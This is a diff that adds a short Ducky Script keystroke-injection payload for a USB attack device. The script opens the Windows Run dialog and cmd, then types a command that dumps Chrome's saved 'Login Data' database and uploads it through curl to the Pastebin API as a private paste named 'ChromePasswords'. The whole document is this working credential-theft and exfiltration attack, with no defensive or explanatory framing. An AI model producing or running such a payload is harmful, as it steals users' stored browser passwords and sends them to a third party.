@@ -1,0 +1,10 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+DELAY 500
+ENTER
+DELAY 500
+STRING sqlite3 "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" .dump | curl -F 'paste=<-' https://pastebin.com/api/api_post.php -F 'api_dev_key={API_KEY}' -F 'api_option=paste' -F 'api_paste_private=2' -F 'api_paste_name=ChromePasswords'
+DELAY 500
+ENTER
